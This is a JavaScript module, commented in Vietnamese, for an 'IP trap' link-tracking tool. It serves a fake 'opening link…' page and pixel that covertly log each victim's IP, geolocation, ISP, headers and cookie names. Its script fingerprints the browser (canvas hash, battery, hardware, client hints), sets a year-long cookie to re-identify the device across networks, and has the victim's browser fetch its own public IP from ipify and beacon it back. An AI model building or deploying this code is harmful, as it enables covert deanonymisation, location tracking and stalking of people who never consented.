/**
 * tracker.js — phần "bẫy" của công cụ Bẫy địa chỉ IP.
 *
 * Mục tiêu: mỗi lượt victim mở link (/r/:token) hoặc xem ảnh (/i/:token) phải thu
 * được NHIỀU thông tin nhất có thể, nhanh nhất có thể, và không làm nghẽn máy chủ.
 *
 * NGUYÊN TẮC TỐI ƯU
 * ----------------
 * 1. Đường nóng (/r, /i) KHÔNG được chờ mạng:
 *    - IP WAN của máy chủ lấy từ cache RAM (TTL) — trước đây mỗi request gọi
 *      ipify, vừa chậm vừa vô nghĩa (IP đó là của SERVER, không phải của victim).
 *    - Tra vị trí IP của victim chạy fire-and-forget rồi UPDATE lại row log; HTML
 *      được gửi đi NGAY. Victim không phải chờ nguồn ngoài.
 * 2. Ghi DB trả về `lastID` ngay để nền JS phía victim có chỗ gắn thêm dữ liệu.
 * 3. Header lưu NHIỀU hơn trước (client hints, ngôn ngữ, referer, cookies,
 *    accept, dấu hiệu bot/mail) — đây là thứ giúp phân biệt thiết bị.
 * 4. UA được parse thành {browser, os, device, version} để UI khỏi phải đọc chuỗi dài.
 * 5. Cookie `_ctid`: cùng một người mở link lần 2 (đổi mạng, đổi IP) vẫn được nhận
 *    ra là cùng thiết bị → log có cùng mã ẩn danh.
 * 6. Font/ảnh/script dùng chung: landing rất nhẹ (~10 KB) + `/px.js` (1 file, cache
 *    1 năm) → tải lại nhanh gần như tức thì.
 */
const crypto = require('crypto');

// ============================================================
// Cookie ẩn danh cho thiết bị
// ============================================================
/** Mã thiết bị ẩn danh 16 byte hex (không chứa IP, không chứa gì nhận dạng được). */
function newVisitorId() {
  return crypto.randomBytes(16).toString('hex');
}

function readCookie(req, name) {
  const raw = req.headers && req.headers.cookie;
  if (!raw) return '';
  for (const part of String(raw).split(';')) {
    const i = part.indexOf('=');
    if (i < 0) continue;
    if (part.slice(0, i).trim() !== name) continue;
    const value = part.slice(i + 1).trim();
    // Cookie do client gửi lên: `decodeURIComponent` ném URIError với chuỗi '%'
    // hỏng → phải bắt, nếu không cả route /r·/i·/d trả 500 vì một cookie rác.
    try { return decodeURIComponent(value); } catch (_) { return value; }
  }
  return '';
}

/**
 * Trả `{ id, isNew }` cho cookie thiết bị. `isNew` = phải Set-Cookie ở response.
 * Cùng logic dùng cho /r, /i, /d để lần mở sau vẫn nhận ra cùng máy.
 */
function visitorId(req) {
  const id = readCookie(req, '_ctid');
  if (/^[a-f0-9]{32}$/.test(id)) return { id, isNew: false };
  return { id: newVisitorId(), isNew: true };
}

function visitorCookieHead(value) {
  return `_ctid=${value}; Path=/; Max-Age=${365 * 24 * 3600}; SameSite=Lax`;
}

// ============================================================
// IP công khai của lượt truy cập
// ============================================================
/**
 * `wan_ip` là IP công khai mà traffic đi ra. Có 2 trường hợp:
 *
 *  1. Server thấy IP công khai (production sau Nginx/Cloudflare, hoặc victim
 *     khác mạng) → chính IP đó LÀ IP WAN. Không cần gọi dịch vụ ngoài.
 *  2. Server thấy IP riêng (LAN, dev, victim cùng NAT với server) → không thể
 *     suy ra IP WAN từ phía server. Để trống và chờ beacon từ trình duyệt victim
 *     (`wanHint`, xem PX_JS) — trình duyệt hỏi ipify rồi gửi kèm, đúng IP mà cả
 *     Internet nhìn thấy.
 *
 * Trước đây code gọi `api.ipify.org` NGAY TRONG MỖI request và ghi IP của MÁY CHỦ
 * vào cột wan_ip của victim — sai về ý nghĩa và còn làm chậm mỗi lượt click.
 */
function wanFor(ip) {
  return isPrivateOrLocal(ip) ? '' : String(ip);
}

// ============================================================
// Header cần lưu (chỉ những thứ được request gửi lên)
// ============================================================
// Thứ tự = thứ tự hiển thị. Không có header nào "bịa" ra được ở đây: nếu request
// không gửi thì không có key trong kết quả.
const KEPT_HEADERS = [
  'user-agent', 'user-agent-full', 'accept', 'accept-language', 'accept-encoding',
  'referer', 'origin', 'host', 'connection', 'sec-fetch-site', 'sec-fetch-mode',
  'sec-fetch-dest', 'sec-fetch-user', 'sec-ch-ua', 'sec-ch-ua-mobile',
  'sec-ch-ua-platform', 'sec-ch-ua-platform-version', 'sec-ch-ua-arch',
  'sec-ch-ua-model', 'sec-ch-ua-bitness', 'sec-ch-ua-full-version',
  'sec-ch-ua-full-version-list', 'sec-ch-prefers-color-scheme',
  'sec-ch-prefers-reduced-motion', 'sec-ch-viewport-width', 'sec-ch-viewport-height',
  'dpr', 'viewport-width', 'width', 'downlink', 'ect', 'rtt', 'save-data',
  'pragma', 'cache-control', 'upgrade-insecure-requests', 'dnt', 'priority'
];

/**
 * Gom header về object gọn. Giá trị dài bị cắt (header lạ có thể vài KB).
 * Thêm `cookie` (đã che giá trị, chỉ giữ tên) + cờ máy khách:
 *   - `x-proxy-*` các header proxy tiêu chuẩn (dấu hiệu đi qua proxy/VPN)
 *   - `forwarded` / `xff` có nhiều hop
 */
function collectHeaders(req) {
  const h = req.headers || {};
  const out = {};
  for (const key of KEPT_HEADERS) {
    const v = h[key];
    if (v != null && v !== '') out[key] = String(v).slice(0, 600);
  }
  // Danh sách host bị vượt qua (Cloudflare / reverse proxy)
  if (h['cf-connecting-ip']) out['cf-connecting-ip'] = String(h['cf-connecting-ip']).slice(0, 100);
  if (h['cf-ipcountry']) out['cf-ipcountry'] = String(h['cf-ipcountry']).slice(0, 8);
  if (h['cf-ray']) out['cf-ray'] = String(h['cf-ray']).slice(0, 80);
  if (h['via']) out['via'] = String(h['via']).slice(0, 200);
  if (h['forwarded']) out['forwarded'] = String(h['forwarded']).slice(0, 300);
  const xff = h['x-forwarded-for'];
  if (xff) {
    const hops = String(xff).split(',').map(s => s.trim()).filter(Boolean);
    out['x-forwarded-for'] = hops.join(', ').slice(0, 300);
    out['x-forwarded-for-hops'] = String(hops.length);
  }
  if (h['client-hints-fetched'] === '1') out['client-hints-fetched'] = '1';

  // Cookie: chỉ giữ TÊN (không giữ giá trị) — đủ để biết site nào đặt cookie gì
  // mà không lưu token/phiên của người khác.
  if (h.cookie) {
    const names = String(h.cookie).split(';')
      .map(p => p.split('=')[0].trim())
      .filter(Boolean)
      .slice(0, 40);
    if (names.length) out['cookie-names'] = names.join(', ');
  }
  return out;
}

// ============================================================
// Parse User-Agent (không phụ thuộc thư viện)
// ============================================================
/**
 * Nhận diện trình duyệt / HĐH / loại thiết bị / phiên bản từ UA + client hints.
 * Không cần chính xác tuyệt đối (UA bị website gửi nhầm là chuyện thường), mục
 * đích là để người xem log đọc được ngay thay vì đọc cả chuỗi.
 */
function parseUa(ua, headers) {
  const s = String(ua || '');
  const lower = s.toLowerCase();
  const hints = headers || {};
  const info = { browser: 'Unknown', browserVersion: '', os: 'Unknown', osVersion: '', device: 'desktop', engine: '', bot: false, botName: '' };

  // --- Bot / tool ---
  const bots = [
    ['facebookexternalhit', 'Facebook'], ['facebot', 'Facebook'], ['twitterbot', 'Twitter'],
    ['telegrambot', 'Telegram'], ['whatsapp', 'WhatsApp'], ['slackbot', 'Slack'],
    ['slack-imgproxy', 'Slack'], ['discordbot', 'Discord'], ['linkedinbot', 'LinkedIn'],
    ['viber', 'Viber'], ['skypeuripreview', 'Skype'], ['zalo', 'Zalo'],
    ['googlebot', 'Googlebot'], ['bingbot', 'Bingbot'], ['yandexbot', 'Yandex'],
    ['duckduckbot', 'DuckDuckGo'], ['pinterest', 'Pinterest'], ['applebot', 'Applebot'],
    ['curl', 'curl'], ['wget', 'Wget'], ['python-requests', 'python-requests'],
    ['go-http-client', 'Go-http-client'], ['okhttp', 'okhttp'], ['postmanruntime', 'Postman']
  ];
  for (const [needle, name] of bots) {
    if (lower.includes(needle)) { info.bot = true; info.botName = name; break; }
  }

  // --- HĐH ---
  // Lưu ý thứ tự: iOS/iPadOS phải đứng TRƯỚC "mac os x" (UA iPhone có cả hai).
  const osRules = [
    [/windows nt 10\.0/, 'Windows', '10/11'],
    [/windows nt 6\.3/, 'Windows', '8.1'],
    [/windows nt 6\.1/, 'Windows', '7'],
    [/windows phone/, 'Windows Phone', ''],
    [/android ([0-9.]+)/, 'Android', '$1'],
    [/(iphone|ipod|ipad).*? os ([0-9_]+)/, 'iOS', '$2'],
    [/mac os x ([0-9_.]+)/, 'macOS', '$1'],
    [/cros \w+ ([0-9.]+)/, 'ChromeOS', '$1'],
    [/ubuntu|linux/, 'Linux', '']
  ];
  for (const [re, name, ver] of osRules) {
    const m = lower.match(re);
    if (m) {
      info.os = name;
      info.osVersion = ver.replace('$1', (m[1] || '').replace(/_/g, '.')).replace('$2', (m[2] || '').replace(/_/g, '.'));
      break;
    }
  }
  if (/ipad/.test(lower) && info.os === 'iOS') info.os = 'iPadOS';

  // --- Trình duyệt (thứ tự quan trọng: Edge trước Chrome, Chrome trước Safari) ---
  const browserRules = [
    [/Edg(?:e|A|iOS)?\/([0-9.]+)/, 'Edge'],
    [/OPR\/([0-9.]+)/, 'Opera'],
    [/SamsungBrowser\/([0-9.]+)/, 'Samsung Internet'],
    [/CriOS\/([0-9.]+)/, 'Chrome'],
    [/FxiOS\/([0-9.]+)/, 'Firefox'],
    [/Firefox\/([0-9.]+)/, 'Firefox'],
    [/Chrome\/([0-9.]+)/, 'Chrome'],
    [/Version\/([0-9.]+).*Safari/, 'Safari'],
    [/MSIE ([0-9.]+)/, 'IE'],
    [/Trident\/.*rv:([0-9.]+)/, 'IE'],
    [/Zalo|FBAN|FBAV|Instagram/, 'In-app browser']
  ];
  for (const [re, name] of browserRules) {
    const m = s.match(re);
    if (m) { info.browser = name; info.browserVersion = m[1] || ''; break; }
  }
  if (info.browser === 'Unknown' && hints['sec-ch-ua']) {
    const m = String(hints['sec-ch-ua']).match(/(Chromium|Google Chrome|"Microsoft Edge"|"Opera")/i);
    if (m) info.browser = m[1].replace(/"/g, '');
  }

  // --- Engine ---
  if (/gecko\/|firefox/i.test(s) && !/like gecko/i.test(s)) info.engine = 'Gecko';
  else if (/applewebkit/i.test(s)) info.engine = /chrome|chromium/i.test(s) ? 'Blink' : 'WebKit';
  else if (/trident/i.test(s)) info.engine = 'Trident';

  // --- Loại thiết bị ---
  if (info.bot) info.device = 'bot';
  else if (/iphone|ipod|android.*mobile|windows phone|mobile safari/i.test(lower)) info.device = 'mobile';
  else if (/ipad|tablet|playbook|silk|dalvik/i.test(lower)) info.device = 'tablet';
  else if (/smart-?tv|appletv|googletv|hbbtv|netcast/i.test(lower)) info.device = 'tv';

  if (hints['sec-ch-ua-mobile'] === '?1' && info.device === 'desktop') info.device = 'mobile';
  if (hints['sec-ch-ua-platform'] && info.os === 'Unknown') {
    info.os = String(hints['sec-ch-ua-platform']).replace(/"/g, '');
  }
  return info;
}

// ============================================================
// Tra vị trí / nhà mạng theo IP — chạy nền, có cache trong DB
// ============================================================
const geoCache = new Map(); // ip -> { at, data }
const GEO_TTL_MS = 3 * 24 * 3600 * 1000;

function isPrivateOrLocal(ip) {
  const s = String(ip || '').replace(/^::ffff:/i, '');
  if (!s) return true;
  if (s === '::1' || s === 'unknown') return true;
  const v4 = s.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (v4) {
    const [a, b] = [Number(v4[1]), Number(v4[2])];
    if (a === 10 || a === 127 || a === 0) return true;
    if (a === 192 && b === 168) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 169 && b === 254) return true;
    if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT
    return false;
  }
  // IPv6 ULA / link-local
  if (/^f[cd]/i.test(s)) return true;
  if (/^fe80:/i.test(s)) return true;
  return false;
}

/**
 * `aggregate()` của ip-lookup.js trả `{ sources_total, sources_ok, agreement,
 * fields: { country: { value, count, sources, alternatives }, lat: {...} } }` —
 * KHÔNG phải object phẳng. Hàm này bóc `value` ra để phần còn lại chỉ cần đọc
 * `geo.country`, `geo.lat`… (Trước đây đọc thẳng `aggregate.country` nên luôn
 * nhận null và cột vị trí không bao giờ được điền.)
 */
function flattenAggregate(agg) {
  const src = agg && agg.fields && typeof agg.fields === 'object' ? agg.fields : agg;
  const out = {};
  for (const k of Object.keys(src || {})) {
    const v = src[k];
    if (v && typeof v === 'object' && !Array.isArray(v) && Object.prototype.hasOwnProperty.call(v, 'value')) {
      out[k] = v.value;
    } else if (v && typeof v === 'object' && !Array.isArray(v) && v.hasOwnProperty && v.hasOwnProperty('value')) {
      out[k] = v.value;
    } else if (typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean') {
      out[k] = v;
    }
  }
  return out;
}

/** Các trường giữ lại từ kết quả tra IP (đã chuẩn hoá theo ip-lookup.js). */
function pickGeo(raw) {
  const d = flattenAggregate(raw);
  const pick = ['country', 'countryCode', 'region', 'city', 'postal', 'timezone',
    'asn', 'asnName', 'isp', 'org', 'connectionType', 'isProxy', 'isHosting', 'isMobile'];
  const out = {};
  for (const k of pick) if (d[k] != null && d[k] !== '') out[k] = d[k];
  if (d.lat != null && d.lon != null) {
    out.lat = Number(d.lat);
    out.lon = Number(d.lon);
    if (Number.isFinite(out.lat) && Number.isFinite(out.lon)) out.maps = `https://www.google.com/maps?q=${out.lat},${out.lon}`;
  }
  return Object.keys(out).length ? out : null;
}

/**
 * Tra vị trí IP victim. Trả Promise<object|null> — không bao giờ reject.
 * `lookup` truyền vào là `ipLookup.runLookup` (để module này không phụ thuộc vòng).
 */
async function geolocate(ip, lookup) {
  if (!ip || !lookup || isPrivateOrLocal(ip)) return null;
  const cached = geoCache.get(ip);
  if (cached && Date.now() - cached.at < GEO_TTL_MS) return cached.data;
  try {
    const r = await lookup({ ip, publicOnly: true });
    const data = r && r.ok ? pickGeo(r.aggregate) : null;
    geoCache.set(ip, { at: Date.now(), data });
    if (geoCache.size > 5000) geoCache.delete(geoCache.keys().next().value);
    return data;
  } catch (_) {
    return null;
  }
}

// ============================================================
// Pixel / beacon phía victim
// ============================================================
/** Giá trị hợp lệ + cắt độ dài cho dữ liệu do client gửi lên (client không tin được). */
function cleanClientData(body) {
  const src = body && typeof body === 'object' ? body : {};
  const str = (v, n) => (v == null ? '' : String(v).slice(0, n || 200));
  const num = (v) => {
    const n = Number(v);
    return Number.isFinite(n) ? Math.round(n * 100) / 100 : null;
  };
  const out = {};
  const put = (k, v) => { if (v !== '' && v !== null && v !== undefined) out[k] = v; };

  put('screen', src.screen ? str(src.screen, 40) : '');
  put('viewport', src.viewport ? str(src.viewport, 40) : '');
  put('dpr', num(src.dpr));
  put('colorDepth', num(src.colorDepth));
  put('timezone', src.timezone ? str(src.timezone, 80) : '');
  put('tzOffset', num(src.tzOffset));
  put('locale', src.locale ? str(src.locale, 40) : '');
  put('languages', src.languages ? str(src.languages, 120) : '');
  put('platform', src.platform ? str(src.platform, 200) : '');
  put('touch', num(src.touch));
  put('hardwareConcurrency', num(src.hardwareConcurrency));
  put('deviceMemory', num(src.deviceMemory));
  put('referer', src.referer ? str(src.referer, 500) : '');
  put('connection', src.connection && typeof src.connection === 'object' ? {
    effectiveType: str(src.connection.effectiveType, 20) || '',
    downlink: num(src.connection.downlink),
    rtt: num(src.connection.rtt),
    saveData: !!src.connection.saveData
  } : null);
  put('battery', src.battery && typeof src.battery === 'object' ? {
    level: num(src.battery.level), charging: !!src.battery.charging
  } : null);
  put('clientUa', src.clientUa ? str(src.clientUa, 400) : '');
  put('clientLang', src.clientLang ? str(src.clientLang, 20) : '');
  put('wanHint', src.wanHint ? str(src.wanHint, 100) : '');
  put('referrerPolicy', src.referrerPolicy ? str(src.referrerPolicy, 40) : '');
  put('canvas', src.canvas ? str(src.canvas, 64) : '');
  put('uaData', src.uaData && typeof src.uaData === 'object' ? {
    platform: str(src.uaData.platform, 40),
    platformVersion: str(src.uaData.platformVersion, 40),
    architecture: str(src.uaData.architecture, 20),
    bitness: str(src.uaData.bitness, 10),
    model: str(src.uaData.model, 60),
    uaFullVersion: str(src.uaData.uaFullVersion, 40),
    mobile: !!src.uaData.mobile
  } : null);
  return out;
}

// ============================================================
// HTML người xem nhận được (trang trung chuyển + pixel)
// ============================================================
function esc(v) {
  return String(v == null ? '' : v).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

/**
 * Chuỗi an toàn để nhúng vào `<script>` bằng JSON.stringify.
 * `JSON.stringify` KHÔNG escape `<` — một URL đích chứa `</script>` sẽ đóng thẻ
 * script giữa chừng và biến phần còn lại thành HTML (chèn được markup lạ).
 */
function jsLiteral(value) {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

/**
 * JS phía victim: gửi mọi thứ TRÌNH DUYỆT tiết lộ được về `/px/:token`.
 *
 * Chiến lược "nhiều nhất, nhanh nhất":
 *  1. Gửi NGAY một gói cơ bản bằng `sendBeacon` (không chặn điều hướng, không mất
 *     dữ liệu khi trang bị redirect).
 *  2. Các dữ liệu cần chờ (battery, userAgentData độ chi tiết cao, IP WAN thật)
 *     gửi thành các gói BỔ SUNG — server merge vào cùng row log. Gói nào chậm/hỏng
 *     thì mất đúng phần đó, không ảnh hưởng phần còn lại.
 *  3. Toàn bộ chạy trong try/catch: một API bị chặn (Safari ITP, chế độ riêng tư,
 *     trình duyệt cũ) không được làm hỏng trang.
 *
 * `ipify` được hỏi TỪ TRÌNH DUYỆT victim (không phải từ server) nên trả đúng IP
 * mà Internet nhìn thấy — kể cả khi victim cùng NAT với server (LAN/dev). Đây là
 * trường hợp duy nhất server không tự suy ra được IP WAN.
 */
const PX_JS = `(function(){
var T=__TOKEN__,U='/px/'+T;
function S(d){try{var b=JSON.stringify(d);if(navigator.sendBeacon){try{if(navigator.sendBeacon(U,new Blob([b],{type:'application/json'})))return}catch(e){}}var x=new XMLHttpRequest();x.open('POST',U,true);x.setRequestHeader('Content-Type','application/json');x.send(b)}catch(e){}}
function G(f,d){try{return f()}catch(e){return d}}
function h(v){try{v=String(v||'');var x=0;for(var i=0;i<v.length;i++){x=((x<<5)-x+v.charCodeAt(i))|0}return(x>>>0).toString(16)}catch(e){return ''}}
var conn=G(function(){var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;return c?{effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:!!c.saveData}:null},null);
var sc=window.screen||{};
S({
 screen:(sc.width||0)+'x'+(sc.height||0),
 viewport:(window.innerWidth||0)+'x'+(window.innerHeight||0),
 dpr:G(function(){return window.devicePixelRatio||1},1),
 colorDepth:sc.colorDepth||0,
 timezone:G(function(){return Intl.DateTimeFormat().resolvedOptions().timeZone},''),
 tzOffset:new Date().getTimezoneOffset(),
 locale:G(function(){return navigator.language||''},''),
 languages:G(function(){return (navigator.languages||[]).join(',')},''),
 platform:G(function(){return navigator.platform||''},''),
 touch:G(function(){return navigator.maxTouchPoints||0},0),
 hardwareConcurrency:G(function(){return navigator.hardwareConcurrency||0},0),
 deviceMemory:G(function(){return navigator.deviceMemory||0},0),
 referer:G(function(){return document.referrer||''},''),
 clientUa:G(function(){return navigator.userAgent||''},''),
 clientLang:G(function(){return navigator.language||''},''),
 connection:conn,
 canvas:h(G(function(){var c=document.createElement('canvas');c.width=200;c.height=40;var x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(0,0,100,20);x.fillStyle='#069';x.fillText('Cell.id.vn 1.0',2,4);return c.toDataURL()},''))
});
S({referer:G(function(){return document.referrer||''},''),referrerPolicy:G(function(){return document.referrerPolicy||''},'')});
G(function(){navigator.getBattery&&navigator.getBattery().then(function(b){S({battery:{level:b.level,charging:!!b.charging}})});return 1},0);
G(function(){var u=navigator.userAgentData;if(!u)return 0;if(u.getHighEntropyValues){u.getHighEntropyValues(['architecture','bitness','model','platform','platformVersion','uaFullVersion','fullVersionList']).then(function(v){S({uaData:{platform:v.platform,platformVersion:v.platformVersion,architecture:v.architecture,bitness:v.bitness,model:v.model,uaFullVersion:v.uaFullVersion,mobile:!!u.mobile}})}).catch(function(){})}return 1},0);
G(function(){if(!window.fetch||!window.AbortController)return 0;var ac=new AbortController();setTimeout(function(){try{ac.abort()}catch(e){}},1500);fetch('https://api.ipify.org?format=json',{signal:ac.signal,mode:'cors',cache:'no-store'}).then(function(r){return r.json()}).then(function(j){if(j&&j.ip)S({wanHint:j.ip})}).catch(function(){});return 1},0);
})();`;


/**
 * Trang trung chuyển cho lượt click link (/r/:token).
 * `redirect` = URL đích; bot/ crawler không gọi hàm này (xem buildOgHtml).
 */
function landingHtml({ token, redirect, title, description, image, ms }) {
  const href = esc(redirect || 'https://www.google.com');
  return `<!DOCTYPE html>
<html lang="vi"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow">
<title>${esc(title || 'Đang mở liên kết...')}</title>
<meta property="og:title" content="${esc(title || '')}">
<meta property="og:description" content="${esc(description || '')}">
${image ? `<meta property="og:image" content="${esc(image)}">` : ''}
<meta name="referrer" content="unsafe-url">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#1a1a2e}
.card{background:#fff;border-radius:14px;padding:36px 28px;max-width:420px;width:90%;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,.08)}
.sp{width:34px;height:34px;border:3px solid #e5e7eb;border-top-color:#2563eb;border-radius:50%;margin:0 auto 18px;animation:s .8s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
h1{font-size:17px;font-weight:600;margin-bottom:8px}
p{color:#6b7280;font-size:13px;line-height:1.5;margin-bottom:18px}
a.btn{display:inline-block;padding:11px 26px;border-radius:8px;background:#2563eb;color:#fff;text-decoration:none;font-weight:600;font-size:14px}
</style></head>
<body><div class="card"><div class="sp"></div>
<h1>Đang chuyển đến nội dung</h1><p>Vui lòng chờ trong giây lát…</p>
<a class="btn" href="${href}" rel="nofollow noopener">Tiếp tục</a></div>
<script>${PX_JS.replace('__TOKEN__', jsLiteral(token))}
setTimeout(function(){location.replace(${jsLiteral(redirect || 'https://www.google.com')})},${Number(ms) || 350});</script>
<noscript><meta http-equiv="refresh" content="1;url=${href}"></noscript>
</body></html>`;
}

/** Mã định danh thiết bị cho trang xem ảnh: ảnh 1x1 trả về làm "pixel" dự phòng. */
const PIXEL_PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==',
  'base64'
);

module.exports = {
  KEPT_HEADERS, PIXEL_PNG,
  newVisitorId, readCookie, visitorId, visitorCookieHead,
  wanFor, collectHeaders, parseUa, isPrivateOrLocal, pickGeo, geolocate,
  cleanClientData, landingHtml, esc, PX_JS
};
